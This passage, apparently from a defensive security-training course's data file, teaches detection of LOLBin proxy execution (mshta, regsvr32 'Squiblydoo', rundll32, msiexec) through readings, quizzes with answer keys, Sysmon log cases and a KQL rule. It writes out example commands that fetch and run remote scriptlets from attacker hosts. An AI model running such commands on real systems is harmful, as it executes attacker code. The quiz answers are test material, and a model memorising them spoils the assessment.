          "explanation": "This reading’s closing point is exactly this: the command line (a script-protocol prefix plus a remote URL) is the tell, not the process name, because mshta.exe itself is a legitimate, signed Windows component that also runs ordinary local HTA files. Filtering on the process name alone cannot separate the two, and a legitimate tool does not run under a renamed copy of mshta.exe, so that option is wrong. Integrity level does not distinguish them (a legitimate HTA runs at the launching user’s integrity, commonly medium) so that option is invented. explorer.exe is the normal parent of anything a user opens, so it is not what marks the command as abuse, making that option wrong as well."
        },
        "xp": 5
      },
      {
        "type": "reading" as const,
        "id": "hsl-r6",
        "heading": "Regsvr32.exe and \"Squiblydoo\": Scriptlets Instead of DLLs (T1218.010)",
        "content": "`regsvr32.exe` is a legitimate Windows utility for registering and unregistering **COM (Component Object Model) DLLs** -- shared code libraries that other Windows applications can call into by a standard interface, rather than each writing their own version of common functionality. Normal, everyday use looks like `regsvr32.exe /s C:\\Program Files\\SomeApp\\plugin.dll`, run automatically by countless software installers immediately after copying a new DLL into place.\n\n### \"Squiblydoo\": Loading a Scriptlet From a URL, With No DLL At All\n\nSecurity researcher Casey Smith documented a specific abuse pattern, nicknamed **Squiblydoo**, that many defenders still call it by today: `regsvr32.exe /s /n /u /i:http://attacker-host/payload.sct scrobj.dll`. Here, `/i:URL` tells `regsvr32.exe` to fetch a COM **scriptlet** (a `.sct` file, containing VBScript or JScript) from that URL and pass it to `scrobj.dll` -- a real, legitimate, Microsoft-signed Windows component (the Windows Script Component runtime) -- for execution; `/u` and `/n` together mean *unregister, and skip the normal DLL-registration entry point*. The result: `regsvr32.exe`'s network-aware fetch capability retrieves and runs a remote script, and because nothing is actually being registered in the traditional sense, this technique leaves **no persistent registry trace of a DLL registration at all** -- making it, by design, harder to find after the fact than the everyday installer usage it mimics.\n\n### Real-World Groups Documented Using This Technique\n\nMITRE ATT&CK's procedure examples for `T1218.010` include: **APT32** (a Vietnam-linked actor), which used `regsvr32.exe` to execute COM scriptlets that downloaded backdoors; **Cobalt Group**, a financially-motivated actor targeting banks, which used it to execute scripts; **Emotet** and **QakBot**, both widespread malware-delivery families, which use `regsvr32.exe` to execute malicious DLL payloads; **Lazarus Group**, which used it during the well-documented \"Operation Dream Job\" campaign; and **Storm-0501**, a ransomware-affiliated actor, which has used `regsvr32.exe` to launch Cobalt Strike Beacon files.\n\n### The Discriminator: Is There a Local DLL, or a Remote URL?\n\nThe distinction that matters to an analyst is structural, not subtle once named: a legitimate installer-driven registration names a **local file path** to a DLL that was just placed on disk moments earlier, usually as a child process of the installer (`msiexec.exe` or a vendor-specific setup executable). The Squiblydoo pattern names a **remote URL**, references `scrobj.dll` explicitly rather than the application's own DLL, and typically appears with no corresponding software installation having just occurred on the host at all. This room's log-analysis and analyst-choice tasks, later in this room, are both built directly around telling these two shapes apart from a real command line.",
        "checkpoint": {
          "question": "Per this reading, when regsvr32.exe is run in the Squiblydoo pattern, the /i: flag pointed at a remote URL together with scrobj.dll. What does that cause it to do, and why does it leave no persistent registry trace of a DLL registration?",
          "options": [
            "It fetches a COM scriptlet from the URL and hands it to scrobj.dll for execution, and because the flags skip normal registration, no DLL-registration entry is written to the registry",
            "It registers a new DLL under a hidden registry key, but Windows automatically purges that key at the next reboot, which is why no trace is left behind for an analyst to find",
            "It writes the scriptlet’s contents into an existing registry Run key for persistence, and that value is then masked from the standard registry-viewing tools analysts normally use",
            "It loads the application’s own local DLL from disk but records the registration only in volatile memory, so the entry disappears the moment the regsvr32.exe process exits"
          ],
          "answer": 0,
          "explanation": "This reading states the mechanism directly: the /i:URL flag fetches a scriptlet and hands it to scrobj.dll for execution, and the skip-registration flags mean nothing is genuinely registered, which is exactly why no persistent DLL-registration trace is left. The “hidden key purged at reboot” option is invented: no registration happens at all, so nothing is created to purge. The scriptlet is not written into a Run key, and registry values are not hidden from standard tools this way, so that option is invented. The pattern references a remote scriptlet and scrobj.dll, not the application’s own local DLL, so the “local DLL recorded in memory” option is wrong."
        },
        "xp": 5
      },
      {
        "type": "question" as const,
        "id": "hsl-q2",
        "question": "A Sysmon record shows regsvr32.exe launched with the command line: regsvr32 /s /n /u /i:http://185.221.20.44/svc.sct scrobj.dll, parented by explorer.exe. Which technique does this match, and what makes it recognizable as abuse rather than a routine software installation registering a DLL?",
        "options": [
          "T1218.010 (Regsvr32) -- the Squiblydoo pattern: a remote URL and scrobj.dll instead of a local application DLL path, with no installer such as msiexec.exe as an ancestor",
          "T1218.010 (Regsvr32), but routine -- explorer.exe as the parent shows a user-initiated action, which marks the registration as an ordinary self-install",
          "T1218.011 (Rundll32) -- scrobj.dll is a DLL, and rundll32.exe is the binary that runs DLL functions, so this is a Rundll32 variant",
          "T1218.005 (Mshta) -- loading a .sct scriptlet from a URL is the mshta.exe scriptlet pattern, recognizable by the .sct file extension"
        ],
        "answer": 0,
        "explanation": "This is exactly the Squiblydoo shape this room's regsvr32 reading described: a remote URL, scrobj.dll rather than a real application DLL, and no installer ancestry. explorer.exe is the normal parent of anything a user double-clicks, including a downloaded file that launches the LOLBin -- so it does not make the command routine, and a self-install would reference a local DLL path rather than a remote URL, so the 'routine self-install' reading fails. The binary being run is regsvr32.exe, not rundll32.exe, so it is not a Rundll32 variant. The .sct scriptlet pattern is shared across several LOLBins, so the extension does not identify mshta.exe; the binary and /i: syntax here are regsvr32's, not mshta's.",
        "xp": 25
      },
      {
        "type": "reading" as const,
        "id": "hsl-r7",
        "heading": "Rundll32.exe and Msiexec.exe: Two More Trusted Doors",
        "content": "### Rundll32.exe: Running a Named Function From Any DLL (T1218.011)\n\n`rundll32.exe` exists to run a specific, named function exported by a DLL -- its ordinary syntax is `rundll32.exe {DLLname},{FunctionName}`, and Windows itself relies on this constantly: opening the Display settings Control Panel item, for instance, can run through `rundll32.exe shell32.dll,Control_RunDLL desk.cpl`, and printer management tools commonly launch via `rundll32.exe printui.dll,PrintUIEntry`. This is precisely the NativeZone mechanism from this room's earlier NOBELIUM reading -- a malicious DLL, already dropped to disk by an earlier stage, run through `rundll32.exe` exactly as any legitimate DLL's function would be.\n\nBeyond running a locally-dropped malicious DLL directly, LOLBAS documents `rundll32.exe` executing a DLL hosted on a remote SMB share without it ever being copied locally first, and a script-execution variant, `rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker-host/payload.sct\")` -- functionally the same remote-scriptlet idea as mshta.exe's and regsvr32.exe's abuse patterns, routed through a third binary. MITRE's procedure examples for `T1218.011` name an especially wide range of actors: **APT28, APT32, APT38, APT41, Lazarus Group, FIN7, Wizard Spider, and Carbanak**, alongside malware families including **Cobalt Strike, QakBot, IcedID, Mimikatz, NotPetya, Bad Rabbit, and Egregor ransomware** -- reflecting how broadly this specific proxy-execution pattern has been adopted across both espionage-motivated and financially-motivated intrusions alike.\n\n### Msiexec.exe: Installing Trust Along With the Payload (T1218.007)\n\n`msiexec.exe` is the Windows Installer engine -- the program that actually processes every `.msi` package, whether launched by a user double-clicking a downloaded installer, or by centralized enterprise deployment tooling pushing software fleet-wide. Because `.msi` packages can embed **custom actions** (arbitrary code or scripts that run automatically during installation) and because `msiexec.exe` can install from a **network-accessible path** as easily as a local one, an attacker can package a malicious payload as an ordinary-looking MSI and have `msiexec.exe` -- a digitally-signed, universally-allowlisted binary -- execute it as part of what looks like a routine software install. A separate, related risk factor is the `AlwaysInstallElevated` Windows policy setting, which, when enabled, lets any user install an MSI package with full SYSTEM-level privileges regardless of their own account's actual permissions -- turning `msiexec.exe` into a privilege-escalation path as well as a proxy-execution one.\n\nMITRE's procedure examples for `T1218.007` include **APT38** (financially-motivated, linked to North Korea), **TA505**, **Molerats**, and **ZIRCONIUM**, all of which have deployed `msiexec.exe` for malicious execution; **Machete**, which used it to install its own namesake malware; and **Mustang Panda**, which leveraged MSI files to distribute the **PlugX** backdoor. Among malware families, **IcedID**, **QakBot**, **Clop**, and **Ragnar Locker** have all used `msiexec.exe` for payload delivery.\n\n### The Shared Discriminator Across Both Binaries\n\nFor `rundll32.exe`, the tell is the same shape this room's regsvr32 reading described: a DLL path pointing somewhere no legitimate application was ever installed (a Temp folder, a user's Downloads directory, an SMB share with no business relationship to the host), or a `javascript:`/scriptlet argument rather than a normal `{DLL},{Function}` pair. For `msiexec.exe`, the tell is the installation **source**: a routine, IT-deployed or user-initiated install references a known, catalogued software package from an expected repository or vendor download page; an abused invocation references an MSI from an unexpected network location, or is followed immediately by process or network activity with no relationship to whatever software the MSI claimed to install.",
        "checkpoint": {
          "question": "Per this reading, what real-world detail from this room's earlier NOBELIUM reading does the rundll32.exe abuse pattern connect back to?",
          "options": [
            "NativeZone, the Stage-3 loader in the NOBELIUM chain, which Microsoft’s write-up states is run through rundll32.exe: exactly the DLL-function proxy pattern this reading describes",
            "EnvyScout, the Stage-1 HTML dropper, which this reading now says was run through rundll32.exe rather than being opened directly by the victim’s browser",
            "BoomBox, the Stage-2 downloader, which this reading states uploaded its stolen data to Dropbox using rundll32.exe as its network transport mechanism",
            "VaporRage, the Stage-4 shellcode downloader, which this reading states is a renamed copy of rundll32.exe rather than its own distinct component"
          ],
          "answer": 0,
          "explanation": "This reading draws the connection explicitly to NativeZone, Stage 3, which this room’s NOBELIUM reading already established runs through rundll32.exe. EnvyScout is opened directly by the browser as an HTML file, not run through rundll32.exe, so that option contradicts the earlier reading. BoomBox exfiltrates to Dropbox with a hardcoded access token, with no rundll32.exe transport role, so that option is invented. VaporRage is its own distinct shellcode-downloader component, not a renamed rundll32.exe, so that option is invented."
        },
        "xp": 5
      },
      {
        "type": "matching" as const,
        "id": "hsl-m1",
        "heading": "Match Each LOLBin to Its Everyday, Completely Legitimate Use",
        "instructions": "Every LOLBin this room covers has a genuinely ordinary, constant, legitimate purpose -- the same purpose an attacker's abuse of it is designed to hide behind. Match each binary to the legitimate use this room's readings describe for it.",
        "pairs": [
          {
            "id": "p1",
            "left": "mshta.exe (T1218.005)",
            "right": "Running a locally-authored .hta file -- a lightweight HTML-plus-script GUI some enterprise installers and internal kiosk or help-desk tools still package this way"
          },
          {
            "id": "p2",
            "left": "regsvr32.exe (T1218.010)",
            "right": "Registering a COM DLL a software installer just copied to disk, run automatically by countless everyday setup programs immediately after installation"
          },
          {
            "id": "p3",
            "left": "rundll32.exe (T1218.011)",
            "right": "Running a named function Windows itself relies on, such as opening the Display Settings Control Panel item or a printer-management dialog"
          },
          {
            "id": "p4",
            "left": "msiexec.exe (T1218.007)",
            "right": "Installing or repairing any software packaged as an MSI file, whether double-clicked by a user or pushed fleet-wide by enterprise deployment tooling"
          }
        ],
        "explanation": "Each pairing reflects this room's own description of that binary's ordinary purpose: mshta.exe runs HTML Applications, regsvr32.exe registers COM DLLs (routine installer behavior), rundll32.exe runs a named DLL function (including Windows' own Control Panel items), and msiexec.exe processes MSI installer packages. This is precisely why none of the four can simply be blocked outright by an allowlisting policy -- doing so would break normal, constant, legitimate Windows and software-installation behavior. Recognizing the legitimate baseline is what makes the abuse patterns (a remote URL where a local path belongs, a scriptlet where a real DLL function belongs) actually stand out.",
        "xp": 25
      },
      {
        "type": "ordering" as const,
        "id": "hsl-o1",
        "heading": "Reconstruct the Delivery-to-Execution Chain",
        "instructions": "Put these five stages -- generalized from this room's HTML Smuggling and LOLBin readings, and matching the real NOBELIUM chain step for step -- into the order they actually occur.",
        "items": [
          {
            "id": "deliver",
            "text": "Victim receives and opens a phishing email or web page carrying a malicious HTML attachment (the EnvyScout equivalent)"
          },
          {
            "id": "smuggle",
            "text": "JavaScript inside the HTML decodes an embedded payload, builds a Blob, and triggers a local download -- the malicious file (e.g. an ISO) never crossed the network as a distinguishable file (T1027.006)"
          },
          {
            "id": "userexec",
            "text": "Victim double-clicks the resulting file, and Windows runs the malicious script or shortcut inside it (T1204.002, User Execution: Malicious File)"
          },
          {
            "id": "proxy",
            "text": "That script invokes a trusted, signed Windows binary (e.g. rundll32.exe) to run the attacker's actual code, so the visible process is a trusted name, not an unknown one (T1218.x, System Binary Proxy Execution)"
          },
          {
            "id": "fetch",
            "text": "The proxy-executed code reaches out to attacker infrastructure to retrieve a further-stage payload (T1105, Ingress Tool Transfer -- the NativeZone-to-VaporRage hop)"
          }
        ],
        "correct_order": [
          "deliver",
          "smuggle",
          "userexec",
          "proxy",
          "fetch"
        ],
        "explanation": "This is the exact sequence this room's readings walked, mirrored precisely by the real NOBELIUM chain: EnvyScout is delivered and opened, its JavaScript smuggles an ISO past the network layer, the victim double-clicks the resulting file to run BoomBox, BoomBox's payload (NativeZone) is proxy-executed via rundll32.exe, and NativeZone fetches the further shellcode stage (VaporRage). Reversing smuggling and delivery makes no sense -- there is nothing to smuggle before the HTML page has been opened. Proxy execution requires a file already on disk to invoke, which requires the smuggling step to have completed first. Fetching a further payload is what the proxy-executed code does once it is already running, not before.",
        "xp": 30
      },
      {
        "type": "question" as const,
        "id": "hsl-q3",
        "question": "Per this room's readings, which of the following command lines is the strongest indicator of msiexec.exe being abused for proxy execution, rather than a routine software installation?",
        "options": [
          "msiexec.exe /i http://185.221.20.44/update.msi /quiet -- installing silently from an unfamiliar external IP with no tie to a known vendor or deployment repository",
          "msiexec.exe /i \\\\FS01\\Software\\agent_v4.2.msi /quiet -- installing silently from the organization's internal software share that IT uses for deployments",
          "msiexec.exe /i C:\\Windows\\CCM\\Cache\\WarehouseScan_v4.2.msi /qn -- installing silently from the SCCM client cache during a deployment window",
          "msiexec.exe /fa C:\\Windows\\Installer\\{GUID}.msi -- repairing an installed application from its cached installer database entry"
        ],
        "answer": 0,
        "explanation": "This room's rundll32/msiexec reading names the installation SOURCE as the key discriminator: a routine install references a known, catalogued repository or vendor location, while an abused invocation references an MSI from an unexpected network location with no established relationship to the organization. The silent install from http://185.221.20.44 is exactly that unfamiliar remote source. The FS01 software-share install is also a network path and also silent, but the source is the organization's own known software share -- a catalogued repository, which this reading treats as routine. The SCCM-cache install comes from the local SCCM cache, a recognized deployment tool's directory. The /fa command is a repair that references Windows' own local installer cache, which this reading does not treat as suspicious on its own.",
        "xp": 25
      },
      {
        "type": "reading" as const,
        "id": "hsl-r8",
        "heading": "What Actually Shows Up in Telemetry: Process Ancestry and Command-Line Tells",
        "content": "Every abuse pattern this room has covered leaves a specific, recoverable shape in endpoint telemetry -- captured most completely by Sysmon Event ID 1 (Process Creation) or an equivalent EDR (Endpoint Detection and Response) process-creation record. Three fields matter far more than any single one alone.\n\n### Tell 1: The Parent Process\n\nEach of this room's four core LOLBins has a small set of parents that make sense, and a much larger set that should draw immediate attention. `mshta.exe` launched directly by `WINWORD.EXE`, `EXCEL.EXE`, or `OUTLOOK.EXE` -- an Office application spawning an HTA-execution utility with no ordinary business reason to do so -- is a strong signal, since this exact chain (a phishing document's macro launching `mshta.exe`) is one of the most common real-world deployments of `T1218.005`. `regsvr32.exe` or `rundll32.exe` launched directly by `explorer.exe` is consistent with a user double-clicking a downloaded file (a shortcut, a batch file) that itself invokes the LOLBin -- exactly the shape this room's HTML-Smuggling-to-execution chain produces. By contrast, `regsvr32.exe` launched by `msiexec.exe` (an installer registering a DLL it just placed on disk) or by a recognized software-deployment agent is the routine, everyday case this room's regsvr32 reading described.\n\n### Tell 2: The Command Line Itself\n\nAn `mshta.exe` command line containing `http://` or `https://`, or a `vbscript:`/`javascript:` protocol prefix, has no equivalent in a purely local, legitimate HTA invocation, which names a local file path. A `regsvr32.exe` command line containing `/i:` followed by a URL is the Squiblydoo shape by definition -- legitimate registrations pass a local DLL path with no `/i:` flag at all. A `rundll32.exe` command line whose DLL path sits in `%TEMP%`, a user's Downloads folder, or an unrecognized directory with no relationship to any installed application, rather than `C:\\Windows\\System32\\` or a known application's own Program Files directory, is a strong anomaly. None of these patterns require deep malware-analysis skill to spot -- they are legible directly in the raw command-line string, which is exactly why command-line auditing (enabling and collecting full process command lines, not just process names) is one of the single highest-value logging changes an organization can make.\n\n### Tell 3: What Happens Immediately Afterward\n\nA LOLBin proxy-executing a remote scriptlet or fetching a further payload typically produces an outbound network connection shortly after launch -- visible not only in EDR/Sysmon telemetry (Sysmon Event ID 3, Network Connection) but equally in a network proxy or firewall log showing that exact process's host reaching out to a newly-seen or low-reputation destination. This is the concrete answer to a common question about this room's subject: detection is **not** limited to endpoint tooling alone. A SIEM (Security Information and Event Management) correlation rule joining a suspicious LOLBin process-creation event with a network-egress event for the same host, in a tight time window, is a completely valid -- and often earlier -- detection path than waiting for EDR to flag the process itself.\n\n### A Fourth, Cross-Referenced Tell: File Creation With Mark-of-the-Web\n\nWhen the chain traces back to an HTML-Smuggled ISO or ZIP, the file-creation event for that container will typically carry a `Zone.Identifier` alternate data stream (`ZoneId=3`, meaning downloaded from the internet) -- the same Mark-of-the-Web artifact this platform's Commodity Initial-Access room covers in full depth. Seeing that artifact on a freshly-created ISO or ZIP, followed shortly by one of this room's LOLBin patterns, is a strong end-to-end correlation across both techniques.",
        "checkpoint": {
          "question": "Per this reading, which parent-child relationship is named as one of the most common real-world deployments of mshta.exe abuse (T1218.005)?",
          "options": [
            "An Office application (WINWORD.EXE, EXCEL.EXE, or OUTLOOK.EXE) directly spawning mshta.exe, typically via a malicious macro, with no ordinary business reason for that chain",
            "svchost.exe spawning mshta.exe during routine scheduled-task servicing, which this reading names as the parent-child pair most abuse cases are built on",
            "lsass.exe spawning mshta.exe, which this reading identifies as the normal way credential-related maintenance tasks invoke HTML applications on a host",
            "TrustedInstaller.exe spawning mshta.exe, which this reading states is the common parent seen during ordinary Windows Update servicing operations"
          ],
          "answer": 0,
          "explanation": "This reading names this exact chain: an Office application spawning mshta.exe, typically via a malicious macro, as one of the most common real-world deployments of this technique. svchost.exe, lsass.exe, and TrustedInstaller.exe spawning mshta.exe are not patterns this reading describes; each of those options attaches a fabricated, plausible-sounding routine to a parent-child pair the reading never names, so all three are invented."
        },
        "xp": 5
      },
      {
        "type": "log_analysis" as const,
        "id": "hsl-la1",
        "heading": "Investigate: A Regsvr32 Command Line After a Clicked Attachment",
        "context": "You are reviewing Sysmon telemetry from a workstation at Thornfield Logistics. An employee reported receiving an invoice-themed email a few minutes earlier and downloading its attachment. This event is the first process-creation record that looks out of place since then.",
        "event": {
          "id": "evt-hsl-la1-001",
          "ts": "2026-06-18T14:22:47.000Z",
          "source": "sysmon",
          "vendor": "Microsoft Sysmon",
          "event_type": "process_create",
          "severity": "high",
          "mitre_technique": "T1218.010",
          "mitre_tactic": "Stealth",
          "hostname": "LT-THN-4471.thornfieldlogistics.local",
          "user_title": "Accounts Payable Clerk",
          "process": {
            "name": "regsvr32.exe",
            "pid": 6820,
            "path": "C:\\Windows\\System32\\regsvr32.exe",
            "parent_name": "explorer.exe",
            "parent_pid": 2244,
            "cmdline": "regsvr32.exe /s /n /u /i:http://198.51.100.77/invoice_svc.sct scrobj.dll",
            "user": "THORNFIELDLOG\\r.esposito",
            "integrity": "medium"
          },
          "description": "r.esposito's workstation shows regsvr32.exe launched directly by explorer.exe roughly six minutes after the reported invoice-attachment download. No software installation or update ticket is on file for this host in the same window.",
          "raw": {
            "event.code": "1",
            "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
            "winlog.computer_name": "LT-THN-4471",
            "winlog.event_id": 1,
            "winlog.event_data.UtcTime": "2026-06-18 14:22:47.311",
            "winlog.event_data.ProcessGuid": "{8f2a1c4e-91b7-4a3d-8e02-6c9f1b3d7a58}",
            "winlog.event_data.ProcessId": "6820",
            "winlog.event_data.Image": "C:\\Windows\\System32\\regsvr32.exe",
            "winlog.event_data.CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.77/invoice_svc.sct scrobj.dll",
            "winlog.event_data.CurrentDirectory": "C:\\Users\\r.esposito\\Downloads\\",
            "winlog.event_data.User": "THORNFIELDLOG\\r.esposito",
            "winlog.event_data.LogonId": "0x3a2f11",
            "winlog.event_data.IntegrityLevel": "Medium",
            "winlog.event_data.Hashes": "SHA256=A0A703F776AF7BD7B2E9C4363FA69888688B29AB36155713366EAE09CD65BA34",
            "winlog.event_data.Signed": "true",
            "winlog.event_data.Signature": "Microsoft Windows",
            "winlog.event_data.SignatureStatus": "Valid",
            "winlog.event_data.ParentProcessGuid": "{2c7d9e11-4f83-4a02-9b6e-1d8a3c5f6e29}",
            "winlog.event_data.ParentProcessId": "2244",
            "winlog.event_data.ParentImage": "C:\\Windows\\explorer.exe",
            "winlog.event_data.ParentCommandLine": "C:\\Windows\\Explorer.EXE"
          }
        },
        "questions": [
          {
            "question": "Which combination of raw fields identifies this as the Squiblydoo abuse pattern, rather than a routine software registering a local DLL?",
            "options": [
              "winlog.event_data.CommandLine carries the /i: flag pointed at a remote URL and targets scrobj.dll rather than a local application DLL, with no msiexec.exe or installer as the ParentImage",
              "winlog.event_data.CurrentDirectory is the user’s Downloads folder, which on its own marks the registration as Squiblydoo no matter what the command line or parent process shows",
              "winlog.event_data.ParentImage is explorer.exe rather than an installer, which by itself confirms abuse even before the command line is examined for a remote source",
              "winlog.event_data.Signature reads Microsoft Windows and SignatureStatus is Valid, so the binary is trusted and the event can be closed without reading the command line"
            ],
            "answer": 0,
            "explanation": "This room’s regsvr32 reading names exactly this pairing: the /i: flag at a remote URL with scrobj.dll as the target, together with the absence of any installer ancestry, is the Squiblydoo shape. The Downloads CurrentDirectory is suggestive context but not the identifier on its own (benign downloads also run from there) so that option over-weights location. explorer.exe is the normal parent of anything a user opens, so the parent alone does not confirm abuse; it is the command line that carries the remote source, making that option wrong. The Valid Microsoft signature is expected here. Regsvr32.exe genuinely is signed, so treating it as grounds to close the event inverts this room’s central point.",
            "xp": 20
          },
          {
            "question": "Given this record alone, what is the single most useful next investigative step?",
            "options": [
              "Pivot on 198.51.100.77 and the scriptlet filename across proxy, firewall and DNS logs for a completed connection and other hosts hitting that infrastructure, and isolate LT-THN-4471 pending results",
              "Close the alert as a false positive, since regsvr32.exe is Microsoft-signed and the registration most likely completed normally like any routine installer-driven one",
              "Reimage LT-THN-4471 at once, before capturing the scriptlet URL or any network evidence, because remediating the host should take priority over scoping the activity",
              "Block the hash of regsvr32.exe across the entire fleet in the EDR so that this binary can no longer launch on any managed workstation anywhere in the environment going forward"
            ],
            "answer": 0,
            "explanation": "This room’s detection reading is explicit that outbound network activity following a proxy-execution pattern is a key corroborating signal, visible in proxy, firewall and DNS logs: exactly the pivot described here, paired with isolating the host as reasonable containment while that pivot runs. Closing it as a false positive on the strength of the Microsoft signature repeats the misunderstanding this room corrects throughout. Reimaging before collecting the URL and network evidence is the right action at the wrong time: it destroys the forensic trail the pivot needs. Blocking the hash of regsvr32.exe would stop a legitimate, constantly used Windows component and break normal operations, so that option is wrong.",
            "xp": 20
          }
        ]
      },
      {
        "type": "reading" as const,
        "id": "hsl-r9",
        "heading": "Professional Detection: Correlation Logic and the False-Positive Discipline",
        "content": "A rule that alerts on every execution of `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, or `msiexec.exe` will alert constantly and be disabled within a week, because -- as this room has stressed throughout -- all four run continuously across any real Windows environment for entirely legitimate reasons. Useful detection depends on encoding the specific shapes this room has named, not the presence of the binary itself.\n\n### The Shape of a Correlation Rule\n\nExpressed close to how a Sigma rule (a vendor-neutral, YAML-based generic signature format many SIEMs can translate into their own query language) or Microsoft Sentinel's Kusto Query Language (KQL) would express it:\n\n```\nDeviceProcessEvents\n| where FileName in (\"regsvr32.exe\", \"mshta.exe\", \"rundll32.exe\")\n| where ProcessCommandLine has_any (\"http://\", \"https://\", \"/i:\", \"javascript:\", \"vbscript:\")\n| where InitiatingProcessFileName !in (\"msiexec.exe\", \"TrustedInstaller.exe\")\n| project Timestamp, DeviceName, AccountName, FileName,\n          ProcessCommandLine, InitiatingProcessFileName\n```\n\nThe logic mirrors this room's own readings exactly: filter to the binaries in question, require a command-line indicator this room has named as an abuse pattern (a URL, the Squiblydoo `/i:` flag, or a script-protocol prefix), and exclude the routine installer-driven parent processes that produce the same binary with a benign command shape. The exact field and table names vary by EDR/SIEM platform, but this three-part shape -- binary, command-line indicator, parent exclusion -- transfers directly.\n\n### Why the Parent-Process Exclusion Matters More Than It Looks\n\nWithout the `InitiatingProcessFileName` exclusion, this rule would still fire on every ordinary software installation that legitimately registers a DLL with a full path containing `http`-adjacent substrings by coincidence (a folder literally named `HTTPModule`, for instance) or, more commonly, simply drown a SOC's queue in installer noise long enough that analysts start reflexively dismissing every alert this rule produces -- the exact alert-fatigue failure mode this platform's other detection-engineering content covers as one of a SOC's most common operational risks.\n\n### The Trap: Escalating Every Regsvr32/Rundll32 Command Line With a Path\n\nA student who has just read about NOBELIUM, QakBot, and a dozen named APT groups is primed to treat any of these four binaries with any unusual-looking command line as automatically hostile. That overcorrection produces exactly the alert-fatigue problem the previous paragraph named. The narrow, specific fact that actually resolves an individual case is the same one this room's log-analysis task exercised: does the command line reference a **remote URL or script-protocol handler with no local software installation to explain it**, or does it reference a **local file path with a legitimate installer or deployment tool as its parent**? This room's analyst-choice task, next, is built to test exactly that judgment on a case designed to look identical to the log-analysis case at first glance.",
        "checkpoint": {
          "question": "Per this reading's correlation-rule pseudocode, why does the InitiatingProcessFileName exclusion (excluding msiexec.exe and TrustedInstaller.exe as parents) matter?",
          "options": [
            "Without it, the rule also fires on routine software installs that legitimately register a DLL, flooding the queue and risking the alert-fatigue failure where analysts reflexively dismiss its alerts",
            "Without it, the rule cannot detect any malicious activity, because this reading states an installer process must be the parent for every genuine scriptlet-fetch or HTA-abuse case",
            "Without it, the query fails to run at all, because this reading states the has_any operator is invalid unless a matching parent-exclusion clause appears in the same query",
            "Without it, the rule can only run on a fixed daily schedule, because this reading states parent-process exclusions are what let a correlation rule run more frequently"
          ],
          "answer": 0,
          "explanation": "This reading states the reasoning directly: the exclusion filters out routine installer-driven cases that would otherwise flood the rule and risk alert fatigue. The installer is not a required parent for malicious cases (it is the routine, legitimate parent the rule is designed to exclude) so that option inverts the reading’s point. The pseudocode is valid and has no such operator dependency, so the “query fails to run” option is invented. Run frequency has nothing to do with parent-process exclusions here, so the “fixed daily schedule” option is invented."
        },
        "xp": 5
      },
      {
        "type": "analyst_choice" as const,
        "id": "hsl-ac1",
        "heading": "Triage: A Rundll32 Command Line During a Software Deployment Window",
        "scenario": "This case has a surface shape similar to the log_analysis case you just worked through: an unfamiliar-looking rundll32.exe command line on a workstation. Review the it_verify data before deciding.",
        "event": {
          "id": "evt-hsl-ac1-001",
          "ts": "2026-06-20T02:15:03.000Z",
          "source": "sysmon",
          "vendor": "Microsoft Sysmon",
          "event_type": "process_create",
          "severity": "medium",
          "mitre_technique": "T1218.011",
          "mitre_tactic": "Stealth",
          "hostname": "WKS-THN-2209.thornfieldlogistics.local",
          "user_title": "Warehouse Operations",
          "it_verify_result": "confirmed",
          "it_verify_message": "Change Ticket CHG-88413: scheduled overnight rollout of the WarehouseScan agent v4.2 via the organization's SCCM deployment tooling to all warehouse-floor workstations, 02:00-04:00 window, 20 June 2026. WKS-THN-2209 is listed in the deployment's target device group.",
          "process": {
            "name": "rundll32.exe",
            "pid": 5112,
            "path": "C:\\Windows\\System32\\rundll32.exe",
            "parent_name": "ccmexec.exe",
            "parent_pid": 3390,
            "cmdline": "rundll32.exe C:\\Windows\\CCM\\WarehouseScanInstall.dll,DoInstall",
            "user": "NT AUTHORITY\\SYSTEM",
            "integrity": "system"
          },
          "description": "WKS-THN-2209 shows rundll32.exe launched by ccmexec.exe (the Microsoft Endpoint Configuration Manager / SCCM client service) at 02:15, running a DLL from the local CCM cache folder with an exported function named DoInstall.",
          "raw": {
            "event.code": "1",
            "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
            "winlog.computer_name": "WKS-THN-2209",
            "winlog.event_id": 1,
            "winlog.event_data.UtcTime": "2026-06-20 02:15:03.884",
            "winlog.event_data.ProcessGuid": "{5b3e8a17-6c94-4d21-9f83-2a7e5c8b1d46}",
            "winlog.event_data.ProcessId": "5112",
            "winlog.event_data.Image": "C:\\Windows\\System32\\rundll32.exe",
            "winlog.event_data.CommandLine": "rundll32.exe C:\\Windows\\CCM\\WarehouseScanInstall.dll,DoInstall",
            "winlog.event_data.CurrentDirectory": "C:\\Windows\\CCM\\",
            "winlog.event_data.User": "NT AUTHORITY\\SYSTEM",
            "winlog.event_data.IntegrityLevel": "System",
            "winlog.event_data.Hashes": "SHA256=B15758AD5A250F27530FB367CDD3DB390E9F7FEA758681156CD700074FE22108",
            "winlog.event_data.Signed": "true",
            "winlog.event_data.Signature": "Microsoft Windows",
            "winlog.event_data.SignatureStatus": "Valid",
            "winlog.event_data.ParentProcessGuid": "{9a1c4d72-3e88-4f0a-8b56-7d2c9e4a6f13}",
            "winlog.event_data.ParentProcessId": "3390",
            "winlog.event_data.ParentImage": "C:\\Windows\\CCM\\ccmexec.exe",
            "winlog.event_data.ParentCommandLine": "\"C:\\Windows\\CCM\\ccmexec.exe\""
          }
        },
        "correct_verdict": "false_positive",
        "explanation": "Every discriminator this room's readings name checks out as benign here: the DLL path sits inside C:\\Windows\\CCM\\, the known working directory of the organization's own SCCM deployment agent (ccmexec.exe), not an unfamiliar Temp or Downloads folder; the parent process is the SCCM client itself, a recognized software-deployment tool, exactly the kind of ancestry this room's readings describe as the routine, everyday case; and the command line names a real local DLL and a plausible function name, not a remote URL or script-protocol handler. The it_verify_message confirms a scheduled, ticketed deployment (CHG-88413) targeting this exact device during this exact time window.",
